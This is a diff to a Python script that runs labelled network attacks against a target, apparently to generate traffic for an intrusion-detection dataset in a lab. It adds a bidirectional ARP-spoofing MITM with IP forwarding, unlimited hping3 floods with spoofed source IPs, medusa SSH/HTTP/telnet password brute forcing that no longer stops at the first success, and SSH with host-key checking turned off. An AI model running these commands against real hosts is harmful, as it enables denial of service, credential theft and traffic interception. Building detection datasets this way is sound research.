@@ -95,6 +95,19 @@ def tool_available(name: str) -> bool:
     return subprocess.run(["which", name], capture_output=True).returncode == 0
 
 
+def detect_gateway() -> str:
+    """Lê `ip route` e retorna o IP do gateway default. "" se não achar."""
+    try:
+        r = subprocess.run(["ip", "route"], capture_output=True, text=True)
+        for line in r.stdout.splitlines():
+            parts = line.split()
+            if line.startswith("default") and "via" in parts:
+                return parts[parts.index("via") + 1]
+    except Exception:
+        pass
+    return ""
+
+
 def run_cmd(cmd: str, timeout: Optional[int] = None) -> subprocess.CompletedProcess:
     try:
         return subprocess.run(
@@ -284,7 +297,8 @@ def run_attack(
 
 # ── Attack definitions ────────────────────────────────────────────────────────
 
-def build_attacks(target: str, duration: int, wordlist_override: Optional[str]) -> Dict:
+def build_attacks(target: str, duration: int, wordlist_override: Optional[str],
+                  iface: str, gateway: str, vim_ssh: str) -> Dict:
     """Return {name: {"label", "cmds", "duration", "requires"}} for all attack types."""
 
     wl_pass, wl_pass_temp = resolve_wordlist(
@@ -332,9 +346,9 @@ def build_attacks(target: str, duration: int, wordlist_override: Optional[str]) 
             "requires": ["medusa"],
             "duration": duration,
             "cmds": [
-                f"medusa -h {target} -u root -P {wl_pass} -M ssh -t 4 -f",
-                f"medusa -h {target} -u admin -P {wl_pass} -M http -m DIR:/ -t 4 -f",
-                f"medusa -h {target} -u root -P {wl_pass} -M telnet -t 2 -f",
+                f"medusa -h {target} -u root -P {wl_pass} -M ssh -t 4",
+                f"medusa -h {target} -u admin -P {wl_pass} -M http -m DIR:/ -t 4",
+                f"medusa -h {target} -u root -P {wl_pass} -M telnet -t 2",
             ],
         },
 
@@ -355,8 +369,16 @@ def build_attacks(target: str, duration: int, wordlist_override: Optional[str]) 
             "requires": ["arpspoof"],
             "duration": duration,
             "cmds": [
-                # arpspoof to gateway — needs actual gateway; uses .1 as convention
-                f"arpspoof -i eth0 -t {target} {target.rsplit('.', 1)[0]}.1",
+                "bash -c '"
+                "sysctl -w net.ipv4.ip_forward=1 >/dev/null; "
+                f"arpspoof -i {iface} -t {target} {gateway} >/tmp/arp1.log 2>&1 & echo $! >/tmp/arp1.pid; "
+                f"arpspoof -i {iface} -t {gateway} {target} >/tmp/arp2.log 2>&1 & echo $! >/tmp/arp2.pid; "
+                "sleep 1; "
+                f"{vim_ssh} \"timeout {duration} bash -c \\\"while true; do "
+                "ping -c1 -W1 8.8.8.8 >/dev/null 2>&1; sleep 1; done\\\"\"; "
+                "kill $(cat /tmp/arp1.pid) $(cat /tmp/arp2.pid) 2>/dev/null; "
+                "sysctl -w net.ipv4.ip_forward=0 >/dev/null"
+                "'",
             ],
         },
 
@@ -365,10 +387,10 @@ def build_attacks(target: str, duration: int, wordlist_override: Optional[str]) 
             "requires": ["hping3"],
             "duration": duration,  # safety cap; --faster makes each cmd finish in ~5s
             "cmds": [
-                # --faster = 100 pkt/s; -c 500 → ~5s, -c 300 → ~3s
-                f"hping3 -S --faster -p 80 -c 500 -a 1.2.3.4 {target}",
-                f"hping3 --udp --faster -p 53 -c 300 -a 9.9.9.9 {target}",
-                f"hping3 --icmp --faster -c 300 -a 8.8.8.8 {target}",
+                # flood com fonte IP forjada FIXA (spoofing), limitado pelo timeout
+                f"hping3 -S --flood -p 80 -a 1.2.3.4 {target}",
+                f"hping3 --udp --flood -p 53 -a 9.9.9.9 {target}",
+                f"hping3 --icmp --flood -a 8.8.8.8 {target}",
             ],
         },
 
@@ -535,9 +557,19 @@ def main() -> None:
                         help="Comma-separated or 'all'")
     parser.add_argument("--duration",     type=int, default=DEFAULT_DURATION,
                         help="Seconds for time-bounded attacks")
+    parser.add_argument("--gap",          type=int, default=0,
+                        help="Segundos ociosos entre ataques para os fluxos drenarem "
+                             "(evita bleed de flood entre janelas; recomendado ~60)")
     parser.add_argument("--dry-run",      action="store_true")
     parser.add_argument("--skip-capture", action="store_true",
-                        help="Do not run tcpdump (useful for re-analyzing)")
+                        help="Force-disable tcpdump (default já é não capturar)")
+    parser.add_argument("--capture", action="store_true",
+                        help="Ligar captura de PCAP (off por padrão; gera arquivos grandes em floods)")
+    parser.add_argument("--gateway", default=None,
+                        help="IP do gateway p/ MITM bidirecional (auto via `ip route` se omitido)")
+    parser.add_argument("--vim-ssh", default=None,
+                        help="Comando SSH p/ a VIM 4 gerar tráfego no MITM "
+                             "(default: ssh -i ~/.ssh/id_ed25519 -o StrictHostKeyChecking=no luiz_henrique@<target>)")
     parser.add_argument("--wordlist",     default=None,
                         help="Custom password wordlist path")
     args = parser.parse_args()
@@ -547,7 +579,14 @@ def main() -> None:
 
     Path(args.output).mkdir(parents=True, exist_ok=True)
 
-    all_attacks = build_attacks(args.target, args.duration, args.wordlist)
+    gateway = args.gateway or detect_gateway()
+    if not gateway:
+        sys.exit("[!] Não consegui detectar o gateway. Passe --gateway explicitamente.")
+    vim_ssh = args.vim_ssh or (
+        f"ssh -i {os.path.expanduser('~/.ssh/id_ed25519')} "
+        f"-o StrictHostKeyChecking=no luiz_henrique@{args.target}")
+    all_attacks = build_attacks(args.target, args.duration, args.wordlist,
+                                args.iface, gateway, vim_ssh)
     temps = all_attacks.pop("_temps")
 
     attack_order = ["recon", "dos", "ddos", "bruteforce", "web",
@@ -592,9 +631,16 @@ def main() -> None:
             target=args.target,
             duration=cfg["duration"],
             dry_run=args.dry_run,
-            skip_capture=args.skip_capture,
+            skip_capture=(args.skip_capture or not args.capture),
         )
         results.append(result)
+
+        # Intervalo ocioso entre ataques: deixa os fluxos do ataque atual drenarem
+        # (idle_timeout/flow_timeout) antes da próxima janela, evitando que tráfego
+        # de flood vaze para a janela seguinte e contamine a atribuição por classe.
+        if args.gap and not args.dry_run and name != selected[-1]:
+            print(f"\n  [gap] {args.gap}s ociosos (drenando fluxos antes do próximo ataque)...")
+            time.sleep(args.gap)
 
     # Cleanup temp wordlists
     for key in ("wl_pass", "wl_web"):
